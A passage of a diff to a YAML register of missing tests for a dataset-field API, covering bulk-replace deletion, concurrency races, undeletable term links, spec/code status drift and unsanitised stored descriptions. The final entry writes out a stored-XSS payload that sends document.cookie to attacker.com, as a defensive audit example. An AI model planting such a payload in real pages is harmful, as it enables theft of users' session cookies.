+    - **Regression-pin matters**: a future maintainer "fixing" the ordering to use
+    `max(created_at)` would flip this — and arguably more correctly match the operator''s
+    mental model. The test pins the current `max(version)` contract so the change
+    becomes deliberate.
+
+
+    Distinct from existing TEST-GAP-767 (cross-dataset by-version leak) and TEST-GAP-768
+    (cross-dataset diff leak) — those are CROSS-DATASET access bugs; this gap is WITHIN-DATASET
+    ordering semantics.'
+  test_class: missing-edge-case
+  criticality: MEDIUM
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-988.yaml
+- gap_id: TEST-GAP-989
+  behaviour: '**`POST /api/datasetfields/{id}/enum_values` is SILENT BULK-REPLACE:
+    a partial body (one item) submitted against a field with three existing items
+    soft-deletes the OTHER TWO.** The operationId says `createEnumValue` (singular
+    CREATE verb — `openapi.yaml:2539`); the OpenAPI summary says "Enum Value CRUD"
+    (hinting at the multi-action shape but burying it). The implementation at `EnumValueServiceImpl.java:91-122`:
+
+
+    - Partitions input by `id != null` (line 97-100): items with id → bulkUpdate path;
+    items without id → bulkCreate path.
+
+    - `softDeleteExcept(datasetFieldId, idsToKeep)` (line 105) — removes every existing
+    row whose id is NOT in the request''s `idsToKeep`.
+
+
+    **Operator-visible failure mode** — a third-party API consumer OR a future UI
+    refactor sending only the changed item against a field with three existing enum
+    values will SILENTLY DESTROY the other two values. The current UI (`DatasetFieldEnumsForm.tsx:90-105`)
+    is well-behaved — it preserves the full `data.enums` array on every submit (lines
+    45-60 initialise defaultValues from the existing enum-list) — but this is a UI-side
+    convention that the API does NOT enforce.
+
+
+    **Why CRITICAL**:
+
+    - **Silent data destruction**: the response is HTTP 201 + the new state — no warning,
+    no diff log of what was removed. An API consumer building an enum value via a
+    "fire-and-forget POST one item" pattern (the most natural read of `createEnumValue`)
+    will destroy other operator-edited values.
+
+    - **Activity-feed insufficiency**: the soft-delete fires a single `DATASET_FIELD_VALUES_UPDATED`
+    activity event with no diff payload — the operator reviewing the feed sees "values
+    updated" not "values destroyed".
+
+    - **Compound with TEST-GAP-990** (no concurrency control): two operators concurrently
+    sending different partial bodies guaranteed to interleave the soft-delete cycles,
+    multiplying the destruction.
+
+    - **OpenAPI contract failure**: the spec at `openapi.yaml:2536-2554` declares
+    operationId `createEnumValue` with body `BulkEnumValueFormData` — but does NOT
+    declare in the description that the body IS THE NEW STATE. Generated client SDKs
+    in Python/Go/Java will offer the method with NO warning.
+
+    - **Live docs silent**: per the sidecar''s doc_drift_findings: the live docs do
+    not describe BULK-REPLACE semantics. Operator has no way to discover the failure
+    mode pre-incident.
+
+
+    Probe P-154 pins this directly.'
+  test_class: missing-edge-case
+  criticality: CRITICAL
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-989.yaml
+- gap_id: TEST-GAP-990
+  behaviour: '**Two concurrent `POST /api/datasetfields/{id}/enum_values` against
+    the same datasetFieldId produce silent last-write-wins — there is NO optimistic
+    locking, NO advisory lock, NO version check.** The implementation runs each call
+    in its own `@ReactiveTransactional` transaction at READ-COMMITTED isolation (`EnumValueServiceImpl.java:40`):
+
+
+    Concurrent T1 + T2 timeline:
+
+    1. T1 reads `getEnumState` (line 51) — pre-T1 state.
+
+    2. T2 reads `getEnumState` — pre-T2 state (= pre-T1 + T1''s not-yet-committed
+    writes are invisible).
+
+    3. T1 `softDeleteExcept(idsToKeep_T1)` — soft-deletes everything not in T1''s
+    request.
+
+    4. T1 `bulkCreate(items_T1)` — creates T1''s new items.
+
+    5. T2 `softDeleteExcept(idsToKeep_T2)` — soft-deletes everything not in T2''s
+    request (INCLUDING T1''s just-created items, since T2''s read happened before
+    T1''s create was visible).
+
+    6. T2 `bulkCreate(items_T2)` — creates T2''s new items.
+
+    7. T1 COMMITS. T2 COMMITS LAST. Final state = T2''s items only. T1''s writes are
+    silently lost.
+
+
+    **Operator-visible failure mode**:
+
+    - One operator editing enum values via the UI form (well-behaved — sends the full
+    current list).
+
+    - One automated script (terraform-odd-provider, glossary-importer) editing the
+    same field''s enum values concurrently.
+
+    - Result: whichever commits last wins; the other''s edits are silently destroyed.
+
+    - The activity feed emits TWO `DATASET_FIELD_VALUES_UPDATED` events; the operator
+    inspecting the feed sees "values updated twice" with no indication that work was
+    lost.
+
+
+    **Why HIGH**:
+
+    - **Silent data destruction (cross-amplifies TEST-GAP-989)**: even when both operators
+    send "full" bodies, their states differ (different concurrent edits) — last-write-wins
+    drops the other''s edits.
+
+    - **No optimistic-lock recovery path**: no HTTP 409 Conflict, no version field
+    on enum_value, no Etag header on the field. The operator cannot retry-on-conflict
+    because there IS no conflict signaled.
+
+    - **Compound with bulk import patterns**: bulk-import scripts often parallelise
+    across fields, but operator + script may collide on the SAME field. The race window
+    is the SQL transaction window — small in absolute terms but realistic during sustained
+    traffic.
+
+    - **Probe P-154 pins this**: emit two concurrent POSTs via `Flux.parallel(2).flatMap(...)`
+    and assert exactly ONE of the two states survives — the other is silently dropped.
+
+
+    Distinct from TEST-GAP-989: that gap is about ONE caller submitting a partial
+    body. THIS gap is about TWO callers submitting different bodies that destructively
+    interleave.'
+  test_class: missing-edge-case
+  criticality: HIGH
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-990.yaml
+- gap_id: TEST-GAP-991
+  behaviour: '**`DELETE /api/datasetfields/{id}/terms/{term_id}` returns 204 No Content
+    but the term may REMAIN VISIBLE in the linked-terms tab** — when the term is linked
+    via BOTH (a) explicit POST /terms (manual link) AND (b) `[[namespace/name]]` marker
+    in the description body (description-link), there are TWO `dataset_field_to_term`
+    rows. The DELETE filters on `IS_DESCRIPTION_LINK.isFalse()` (`TermRelationsRepositoryImpl.java:179`)
+    — removing ONLY the manual row. The description-link row survives.
+
+
+    **Operator-visible failure**:
+
+    - User clicks ''X'' on a term tag in the UI.
+
+    - UI dispatches DELETE.
+
+    - Backend returns 204.
+
+    - UI removes the tag from local state (it was "deleted").
+
+    - User refreshes the page (or another user opens the field).
+
+    - The term list re-fetches from the backend.
+
+    - The description-link row is returned by the GET endpoint.
+
+    - The term REAPPEARS in the linked-terms tab.
+
+
+    Operator''s mental model: "I deleted the term but the platform won''t let me —
+    it keeps coming back." The actual remedy (edit the description and remove the
+    `[[ns/name]]` marker) is undocumented; the operator has no signal from the API
+    or UI that the term is description-linked.
+
+
+    **Why HIGH**:
+
+    - **Operator-trust erosion**: "delete succeeded but term is still there" reads
+    as platform malfunction. Repeated occurrences erode confidence in the platform''s
+    correctness.
+
+    - **Cross-pillar coupling (P-01 × P-06)**: dataset-field metadata (P-01) and term-linkage
+    (P-06) intersect at the `dataset_field_to_term` table; the dual-source-of-truth
+    model isn''t surfaced at either pillar''s doc.
+
+    - **The endpoint description is incomplete**: live docs read "Delete term from
+    current dataset field terms list" — does NOT warn that this removes only manual
+    links.
+
+    - **Cross-class effect**: a sibling `addDatasetFieldTerm` adds a manual row even
+    if a description-link already exists (`onDuplicateKeyIgnore` short-circuits the
+    manual insert); the asymmetry is: ADD creates one row OR no-ops; DELETE removes
+    one row OR no-ops; but the description-link row is INVISIBLE to both operations
+    from the term-tab perspective.
+
+    - **Probe P-155 pins this directly**.
+
+
+    Distinct from TEST-GAP-295 (term-linking side-channel through description) and
+    TEST-GAP-288/290 (other term-linkage gaps) — those are about ADDING term links
+    via description; this gap is about FAILING TO REMOVE them via the explicit DELETE
+    endpoint.'
+  test_class: missing-edge-case
+  criticality: HIGH
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-991.yaml
+- gap_id: TEST-GAP-992
+  behaviour: '**Three PUT endpoints on `DatasetFieldController` return HTTP 200 —
+    but the OpenAPI spec declares HTTP 201.** The spec/code drift affects:
+
+
+    - `PUT /api/datasetfields/{id}/description` — spec at `openapi.yaml:2465` declares
+    `''201'': description: OK`; controller returns `ResponseEntity::ok` (`DatasetFieldController.java:42`)
+    = HTTP 200.
+
+    - `PUT /api/datasetfields/{id}/name` — spec at `openapi.yaml:2488` declares 201;
+    controller returns 200 (line 52).
+
+    - `PUT /api/datasetfields/{id}/tags` — spec at `openapi.yaml:2511` declares 201;
+    controller returns 200 (line 62).
+
+
+    **Notable asymmetry** (per `DatasetFieldController.md:bugs_limitations_corner_cases.[5]`):
+    the `POST /enum_values` endpoint CORRECTLY returns HTTP 201 (`HttpStatus.CREATED`
+    at line 71) matching the spec at `openapi.yaml:2549`. So only the three PUTs drift;
+    the POST does not. The drift implies the controller author followed the spec for
+    one endpoint but not the others.
+
+
+    **Operator-visible failure modes**:
+
+    - Generated client SDKs (Python, Go, Java) generated FROM the OpenAPI spec branch
+    on the declared response code. An SDK that branches `if (response.status == 201)
+    { /* parse body */ } else { /* error */ }` will silently mishandle the 200 success
+    path — falling into the error branch, possibly retrying, possibly raising an unmodeled
+    exception.
+
+    - Reverse-proxy / API gateway logging that filters by 2xx subgroup boundaries.
+
+    - Operator-facing API documentation generated from the OpenAPI spec advertises
+    201 — operator testing in curl sees 200 and assumes a documentation bug.
+
+
+    **Why MEDIUM not HIGH**:
+
+    - Both 200 and 201 are 2xx success; the practical impact is limited to SDK-consumer
+    correctness.
+
+    - The fix is trivial — change `ResponseEntity::ok` to `ResponseEntity::created`
+    (or update the spec to 200). The choice is the question: spec or code is the source
+    of truth?
+
+    - The asymmetry (POST 201 ok, PUTs 200 drift) suggests the spec is the source-of-truth
+    and the PUTs should follow `ResponseEntity::created`.
+
+
+    No test pins the current drift. A regression-pin test asserting "200 on PUT" locks
+    the current state; a fix flipping the assertion locks the intent.'
+  test_class: missing-integration
+  criticality: MEDIUM
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-992.yaml
+- gap_id: TEST-GAP-993
+  behaviour: '**`PUT /api/datasetfields/{id}/description` persists the description
+    body VERBATIM into `dataset_field.internal_description` — including `<script>`
+    / `<img onerror>` / `javascript:` payloads.** No sanitisation at any backend layer
+    (controller has no validation; service has no `Jsoup.clean`; repository has no
+    `Encode.html` — `ReactiveDatasetFieldRepositoryImpl.java:73-80` shows only empty-to-null
+    normalisation at line 75). The platform''s XSS defense is single-layered: UI-side
+    render-layer at `Markdown.tsx` (probe P-009 covered) strips dangerous tags at
+    DOM-render time.
+
+
+    **F-004 verbatim-storage fingerprint at the column-level surface**:
+
+    - **Entity-level sibling**: `ReactiveDataEntityRepositoryImpl.setInternalDescription`
+    — same verbatim-storage pattern at the entity level (covered by F-004 batch-R
+    coverage; the entity-level Markdown.tsx render is covered by P-009).
+
+    - **Column-level surface**: the `DatasetField description tab` renders `dataset_field.internal_description`
+    through the same Markdown component. Whether cross-tab Markdown.tsx coverage applies
+    to DatasetField is UNVERIFIED per F-004 batch-R notes — there''s a structural-test-coverage
+    hole.
+
+
+    **Operator-visible failure modes**:
+
+    - A malicious user (or a compromised internal account) crafts a description like
+    `<img src=x onerror="fetch(''//attacker.com?cookie=''+document.cookie)">`. The
+    payload persists in DB. Every other authenticated user viewing the field''s description
+    tab triggers the JavaScript (if Markdown.tsx doesn''t strip it).
+
+    - A maintainer refactoring Markdown.tsx (or replacing it with a new render pipeline)
+    could accidentally drop the dangerous-tag stripping. With no backend defense,
+    the entire column-description surface becomes a stored-XSS vector overnight.
+
+    - Operators auditing log files would see the description column persists unsanitised
+    content but no signal whether the UI render is safe.
+
+
+    **Why HIGH**:
+
+    - **Stored XSS at the platform''s most-edited surface**: every operator-curated
+    column description is a potential XSS vector if the UI defense slips.
+
+    - **Defence-in-depth single-layer**: a sanitiser at the DB write boundary would
+    protect against UI-render regression. The current design accepts this gap deliberately
+    — the test gap is the regression-pin that converts "intentional design" into "deliberate
+    test update".
+
+    - **Cross-pillar amplification (P-01 × P-09)**: dataset-field metadata (P-01)
+    intersects security (P-09); a maintainer auditing P-01 alone misses the security
+    half.
+
+
+    No test pins this — neither the verbatim-storage contract nor the UI-render defense
+    intersection.'
+  test_class: missing-security
+  criticality: HIGH
+  node_id: ''
+  feature_id: null
+  proposed_test_files_count: 0
+  related_refactor_ids: []
+  related_doc_gap_ids: []
+  detail_path: detail/TEST-GAP-993.yaml
